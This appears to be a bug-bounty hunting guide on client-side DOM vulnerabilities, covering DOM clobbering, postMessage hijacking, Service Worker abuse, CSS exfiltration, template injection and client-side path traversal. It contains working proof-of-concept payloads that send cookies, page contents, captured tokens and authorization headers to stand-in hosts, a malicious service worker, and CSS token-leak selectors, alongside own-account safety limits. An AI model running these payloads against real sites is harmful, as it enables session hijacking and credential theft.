---
name: hunt-dom
description: "Hunt client-side DOM vulnerabilities — DOM Clobbering (overwrite JS globals via HTML injection), PostMessage hijacking (missing origin check), Service Worker abuse (intercept requests from same-origin script), CSS Injection/Exfiltration (attribute selectors → token char-by-char via OOB), client-side template injection, dangerouslySetInnerHTML. Grounded in named public research: Gareth Heyes / PortSwigger DOM-clobbering + DOM-Invader, Michał Bentkowski DOMPurify clobbering bypasses, jQuery htmlPrefilter XSS (CVE-2020-11022 / CVE-2020-11023), d0nut CSS-exfil research. Also covers client-side path traversal (CSPT/OSRF, chained to CSPT2CSRF, e.g. Grafana CVE-2025-4123) and iframe-trap persistence of same-origin XSS. Use when hunting DOM-XSS, CSPT, client-side auth bypass, or token exfiltration without server-side interaction."
sources: portswigger_research, hackerone_public, github_security_advisories, doyensec_research, grafana_advisory
report_count: 14
---

# HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil

## Crown Jewel Targets

DOM-based attacks execute in the victim's browser — the server often never sees the payload, so WAFs and server-side input filters do not apply. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.

**Highest-value chains:**
- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or shadows `document.getElementById`, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
- **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.

### Grounding — public research this is distilled from
- **DOM Clobbering / DOM-Invader** — Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
- **DOMPurify clobbering & mXSS bypasses** — Michał Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.
- **jQuery `htmlPrefilter` self-closing-tag XSS** — **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.
- **CSS exfiltration** — d0nut "CSS Injection Attacks" / "Stealing Data With CSS" research (sequential `@import` recursion to drop the per-char-position constraint).
> Cite only what you reproduce. Do not paste these as "proof" in a report — your PoC against the live target is the evidence. Named research here is for *technique provenance*, not severity inflation.

---

## Attack Surface Signals

```
# Injection points that allow MARKUP but may strip <script>:
user bio / display name / comment / markdown preview / SVG upload / CMS rich-text

# postMessage endpoints (iframes, SSO widgets, payment frames, chat widgets):
*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes

# Service worker presence:
/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)

# CSS injection points:
?theme=  custom-css profile field  email-template editor  style= passthrough
```

---

## Phase 1 — DOM Clobbering

```bash
# Signal: app reads element IDs/names as if they were JS objects, OR feeds a
# clobberable global into a sink (location, innerHTML, eval, script.src).
# Inject MARKUP (no script) at a sink that lets named/id'd elements through.

# Single-level clobber of window.config:
#   <a id="config" href="https://evil.example">
# Clobber a NON-built-in global the app reads (built-in methods like getElementById can't be shadowed this way):
#   <a id="config"></a><a id="config" name="url">   # window.config.url resolves to an attacker-controlled element/string
# Clobber a string-coerced URL value (anchor toString() == href):
#   <a id="x"></a><a id="x" name="y" href="https://evil.example">   # x.y -> href
# Nested window.a.b.c via form/inputs:
#   <form id="a"><input id="b" name="c" value="clobbered"></form>
# baseURI / relative-URL hijack:
#   <base href="https://evil.example/">      # bends every relative src/href
```

```javascript
// Browser console: find globals that are clobberable AND reach a sink.
// A var only matters if the app later concatenates it into a URL/HTML/eval.
const susp = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];
susp.forEach(k => {
  const v = window[k];
  // HTMLCollection / element => already clobbered or clobberable namespace
  if (v && (v instanceof Element || v instanceof HTMLCollection))
    console.log('[CLOBBERED/NAMESPACE]', k, v);
  else if (v !== undefined) console.log('[GLOBAL]', k, '=', v);
});
```

```bash
# Source review: find globals fed into sinks (this is what makes clobbering exploitable)
curl -s "https://$TARGET/" | grep -nE \
  "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
# DOM-Invader (Burp) → enable "DOM clobbering" — it auto-finds clobberable sources→sinks.
```

**jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed to `.html()`/`.append()` self-mutates to execute (**CVE-2020-11022 / CVE-2020-11023**). Confirm version then test `<style><style /><img src=x onerror=alert(document.domain)>`.

---

## Phase 2 — PostMessage Hijacking

Two bug classes: (a) **listener** trusts cross-origin data → drive a sink/privileged action; (b) **sender** broadcasts secrets with target origin `'*'` → any framing page reads them.

```bash
# Find handlers and flag the ones with NO origin check
grep -rnE "addEventListener\(\s*['\"]message['\"]|onmessage\s*=" recon/$TARGET/ --include="*.js" 2>/dev/null \
  | grep -vE "\.origin\b" 
# Then for each, read +/- 20 lines: where does event.data go? (innerHTML/eval/location/token store)
# Senders that leak: grep for postMessage(<secret>, '*')
grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" recon/$TARGET/ --include="*.js" 2>/dev/null
```

```html
<!-- PoC A: drive a no-origin-check LISTENER from an attacker page -->
<!-- Host on attacker.example; frames target and pushes a privileged message -->
<iframe id="f" src="https://TARGET/page-with-listener"></iframe>
<script>
  document.getElementById('f').onload = () => {
    const w = document.getElementById('f').contentWindow;
    // Shape the payload to whatever the handler routes into a sink:
    w.postMessage({type:'navigate', url:'javascript:fetch("https://OOB/x?c="+document.cookie)'}, '*');
    w.postMessage('<img src=x onerror=fetch("https://OOB/dom?h="+btoa(document.body.innerHTML))>', '*');
  };
</script>
```

```html
<!-- PoC B: capture secrets from a SENDER that uses targetOrigin '*' -->
<iframe id="f" src="https://TARGET/sso-or-widget" style="display:none"></iframe>
<pre id="out"></pre>
<script>
addEventListener('message', e => {
  // Only count it if e.origin is the TARGET and data carries a secret
  out.textContent += `origin=${e.origin}\ndata=${JSON.stringify(e.data)}\n---\n`;
  if (/token|session|jwt|code=/i.test(JSON.stringify(e.data)))
    fetch('https://OOB/pm?d='+encodeURIComponent(JSON.stringify(e.data))); // OOB proof
});
</script>
```

> False-positive guard: a handler with a *partial* check (`origin.indexOf('target.example')>-1`, `endsWith('target.example')`, regex `target\.com`) is still vulnerable — bypass with `target.example.evil.example` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.

---

### PostMessage handler race — win the message before origin is set
Beyond static origin/sender checks: some handlers trust the FIRST message, or read `event.origin` while it is still `""`/`null` during frame load. Race it — flood `postMessage` in a tight loop during iframe/popup load, or fire from `about:blank` before navigation, so your message lands before the legit sender or before strict origin setup runs. Test any handler that assumes "first message = trusted". Disclosed: reports/381356.

## Phase 3 — Service Worker Abuse

**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.example/sw.js`) throws `SecurityError` — there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.

So the realistic path is: get a SW script **onto the target origin** (file upload that serves JS, open-redirect/path the origin reflects as a script, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.

```bash
# Enumerate existing SW + its scope
curl -s "https://$TARGET/" | grep -iE "serviceWorker\.register|navigator\.serviceWorker"
for p in sw.js service-worker.js firebase-messaging-sw.js ngsw-worker.js; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://$TARGET/$p"; done
curl -s "https://$TARGET/sw.js" | grep -iE "scope|addEventListener\('fetch'|caches"
# Look for an upload/route that returns Content-Type: text/javascript on YOUR content:
#   curl -s -D- https://$TARGET/uploads/<id> | grep -i content-type
```

```javascript
// Runs in same-origin XSS. SCRIPT MUST BE SAME-ORIGIN (e.g. /uploads/evil-sw.js
// served by the target). scope must be <= the directory the script is served from
// unless the response carries Service-Worker-Allowed.
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})
  .then(r => fetch('https://OOB/sw-registered?scope='+r.scope))  // OOB proof of registration
  .catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope

// evil-sw.js (served from the TARGET origin):
self.addEventListener('fetch', e => {
  e.respondWith(fetch(e.request.clone()).then(async resp => {
    // Exfil URL + any auth header the page attaches, to OOB
    fetch('https://OOB/sw-intercept', {method:'POST',
      body: JSON.stringify({url: e.request.url,
        auth: e.request.headers.get('authorization')})});
    return resp;
  }));
});
```

> Persistence note: a SW survives tab close and re-runs on next visit within scope — that is what makes it Critical. Confirm persistence by closing all tabs, reopening the origin, and showing a fresh OOB hit with no XSS re-trigger.

---

## Phase 4 — CSS Injection / Exfiltration

```bash
# Prereq: attacker controls CSS (custom-theme field, style= passthrough, email
# template, markdown CSS). Targets: hidden CSRF input, API key in meta, nonce attr.
# Step 1 confirm injection: inject "color:red" on a known element, observe render.
# Step 2 leak attribute values char-by-char via attribute selectors + url() to OOB.
```

> **Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that blocks *script execution* — it does **not** bypass a CSP whose `style-src` / `img-src` / `default-src` / `connect-src` restricts external origins, or `form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is **blocked**. Always read the live `Content-Security-Policy` header first; if external resource origins are locked down, CSS exfil is dead and you should say so rather than claim it.

```css
/* One request fires only for the matching first char. */
input[name="csrf"][value^="a"] { background: url(https://OOB.example/c?p=0&c=a); }
input[name="csrf"][value^="b"] { background: url(https://OOB.example/c?p=0&c=b); }
/* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */
meta[name="csrf-token"][content^="a"] { background: url(https://OOB.example/c?m=a); }
```

```python
# Generate a single-position CSS exfil set (loop positions with sequential @import in practice)
import string
chars = string.ascii_letters + string.digits + '-_'
attr, oob, pos = 'name="csrf"', 'https://OOB.example/c', 0
print("\n".join(
  f'input[{attr}][value^="{c}"]{{background:url({oob}?p={pos}&c={c})}}' for c in chars))
# Real exfil needs recursion: serve a stylesheet whose @import pulls the next
# position's rules only after the current prefix matched (d0nut technique) —
# this removes the "static input, one char" limitation.
```

> Validation: the proof is **OOB hits**, not a rendered color. Stand up a Collaborator / request-bin and show one hit per correct character forming the real token, then demonstrate using that token in a state-changing CSRF request. No OOB callback = no finding (a 0-byte image or CSP-blocked request looks identical to success in DevTools).

---

## Phase 5 — dangerouslySetInnerHTML / framework sinks

```bash
grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" recon/$TARGET/ --include="*.js" 2>/dev/null
# In minified Next/React bundles:
curl -s "https://$TARGET/_next/static/chunks/pages/index.js" | grep -oP 'dangerouslySetInnerHTML.{0,120}'
# Trace whether user data reaches it WITHOUT a sanitizer (DOMPurify/sanitize-html).
# If DOMPurify IS present, check for clobbering/mXSS bypass (Bentkowski research) and version.
# Version gates (DOMPurify.version): <3.1.3 mXSS/namespace confusion (Mizu); <3.2.4 CVE-2025-26791 (SAFE_FOR_TEMPLATES only);
# 3.1.3-3.2.6 CVE-2025-15599 (SAFE_FOR_XML / textarea, fixed 3.2.7); 3.0.1-3.3.3 CVE-2026-41238 (prototype pollution
# plants permissive custom-element checks, fixed 3.4.0). Details and sources: hunt-xss "Sanitizer Bypasses".
```

---

## Phase 6 — Client-Side Template Injection

```bash
# Detect framework, then test the {{}} sink in a sandbox-bypass form.
grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/$TARGET/ --include="*.js" 2>/dev/null | head
# Probe (server may render, so confirm it's CLIENT-side by viewing rendered DOM, not curl):
#   {{7*7}}  -> 49 in the live DOM (not in raw HTML) => CSTI
# AngularJS sandbox-escape style payloads (version-dependent; older 1.x):
#   {{constructor.constructor('alert(document.domain)')()}}
# Vue: {{_c.constructor('alert(1)')()}}    (varies by Vue 2/3 build)
```

---

## Phase 7 — Client-Side Path Traversal (CSPT / OSRF)

CSPT (also **on-site request forgery, OSRF**) is a *client-side* bug: the front-end builds an API path by concatenating attacker-influenced input, so `../` dot-segments in that value retarget the browser's own authenticated request to a **different endpoint on the same origin**. The rerouted request still carries the session cookie and any auth header the JS attaches, so a harmless-looking parameter becomes a CSRF / account-action primitive. Doyensec's *CSPT2CSRF* defines the two halves precisely: the **source** is any user-controlled data that feeds the path (URL fragment, query/path parameter, or data read back from the DB); the **sink** is the legitimate request that gets rerouted — and the attacker usually does **not** control the method, headers, or body, only where the path lands.

```bash
# Signal: SPA builds fetch()/XHR paths from route params, slugs, or stored values,
# and attaches credentials. Look for string concatenation into an /api/ path.
grep -rnE "fetch\(|axios\.|XMLHttpRequest|\.open\(" recon/$TARGET/ --include="*.js" 2>/dev/null \
  | grep -E "\+|\`|\$\{" | grep -iE "/api/|/proxy/|/v[0-9]+/"
```

```javascript
// Browser console: flag requests whose path carries dot-segments AND credentials.
// Detection only — logs candidates, performs no action.
const of = window.fetch;
window.fetch = function (i, init) {
  const u = typeof i === 'string' ? i : i?.url;
  if (u && /(\.\.\/|%2e%2e|\.\.;)/i.test(u))
    console.log('[CSPT candidate]', u, init?.method || 'GET', init?.credentials);
  return of.apply(this, arguments);
};
```

**GET sink vs POST sink (Doyensec):** a **GET** sink standalone leaks data or feeds XSS; its real use is as a *gadget* — reroute a GET to an endpoint whose JSON response you can influence (e.g. an `id`), then feed that into a **POST/PUT/DELETE** sink to drive a state change (CSPT→CSPT2CSRF). Dot-segment variants to try when the router normalises: `../`, `%2e%2e/`, `..%2f`, `..;/`. A static-looking suffix (`.json`, `.css`) can additionally flip a CDN into caching the rerouted authenticated response — that crosses into cache deception, so chain `hunt-cache-poison`.

> **Real case (verified this session):** Grafana **CVE-2025-4123** (CVSS 7.6, PR:N/UI:R) — a CSPT in `/public/plugins/<id>/...` path handling chained with an open redirect loaded an attacker plugin module → XSS; no editor permission required, and exploitable under anonymous access. Fixed in 10.4.18, 11.2.9, 11.3.6, 11.4.4, 11.5.4, 11.6.1 and 12.0.0 (all `+security-01`). ([Grafana advisory](https://grafana.com/blog/2025/05/22/grafana-security-release-high-severity-security-fix-for-cve-2025-4123/))

> **Safety — CSPT performs a real action as the victim.** Prove it on *your own* account only. Prefer a **read-only** endpoint for the redirect PoC (show the rerouted request reaching an endpoint the UI never meant to call). Run a state-changing variant only against your own account and keep it reversible. **Never** write a step that performs a state change on a third party. A `../` that resolves back to the intended endpoint is not a finding.

> Tooling: Doyensec's CSPT Burp extension (source→sink correlation), Eval Villain, and the CSPT Playground are the standard aids — verify the current repo URL before citing any in a report (house rule).

---

## Phase 8 — Iframe Traps (same-origin XSS persistence)

An iframe trap is a **persistence** primitive, not an entry point: it assumes you **already** have same-origin XSS (reflected or stored), then keeps that execution alive by trapping the rest of the victim's navigation inside a full-viewport same-origin iframe while the attacker-controlled top window survives and observes. The top page can mirror the framed path into the address bar with `history.replaceState()` so the victim believes they are browsing normally.

```javascript
// Detection PoC — YOUR OWN BROWSER ONLY. Frames a same-origin route and logs that
// navigation survives in the top window. No exfil, no input capture.
const f = document.createElement('iframe');
f.src = '/';                 // any same-origin route
f.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:2147483647';
document.body.appendChild(f);
f.addEventListener('load', () =>
  console.log('[iframe-trap] top-window alive, framed path =', f.contentWindow.location.pathname));
```

- **Header reality (verified against the technique's own write-ups):** `X-Frame-Options: SAMEORIGIN` and CSP `frame-ancestors 'self'` do **not** stop a same-origin trap — the app is framing itself. Only `DENY` / `frame-ancestors 'none'` on the sensitive routes defeat it.
- **SPA targets:** a real trap hooks `fetch`, `XMLHttpRequest`, `pushState`/`replaceState` and form events inside the framed app; a top-level guard stops the implant re-framing itself on every route. (Describe these in the report — do not ship a data-collecting implant against anyone but yourself.)
- **Limits:** cross-origin navigation kills DOM access (SOP); closing the tab, typing a new URL, or any browser-chrome action the page cannot suppress ends the trap; fullscreen needs a user gesture and is concealment, not containment.

> **Safety — affects a real user's browsing.** Demonstrate only in your own browser: a same-origin frame of a sensitive route that survives N navigations, logged to the console, with **no** exfiltration and **no** keystroke/field capture. This is not a standalone finding — it requires a confirmed same-origin XSS first.

---

## Chain Table

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
| PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
| PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
| CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
| Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
| dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |
| CSPT (GET sink) → id gadget → CSPT (POST sink) | retarget authenticated request → state change (own-account PoC) | CSPT2CSRF (High) |
| Iframe trap after same-origin XSS | persist execution + observe framed navigation (own browser) | XSS persistence (scales with what the XSS reaches) |

---

## Tools

```bash
# DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner, and a
#   prototype-pollution scanner (off by default; enable under Attack types): finds URL / JSON web-message
#   sources and scans for gadgets. A hit there is the prerequisite for DOMPurify CVE-2026-41238.
# postMessage-tracker — Chrome extension logging cross-window messages
# Burp Collaborator / interactsh / request-bin — MANDATORY OOB sink for CSS-exfil & SW PoCs
# Verify any tool URL before citing it in a report; do not paste unverified repo links.
```

---

## Validation (false-positive discipline)

Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.

- **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
- **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
- **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
- **CSPT** — proof is the *rerouted* request reaching an endpoint the UI never meant to call, shown on your own account. A traversal that resolves back to the intended endpoint, or a same-origin reflection with no path reroute, is not CSPT. Run state-change proofs on your own account only, reversible.
- **Iframe trap** — not a standalone finding: requires a confirmed same-origin XSS first. Prove only in your own browser with a console log of surviving navigation; no third-party data, no keystroke capture.
- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.

**Severity:**
- Same-origin Service Worker → persistent credential intercept: **Critical**
- PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
- DOM Clobbering → DOM-XSS reaching auth/session: **High**
- CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the chained CSRF is account-critical)
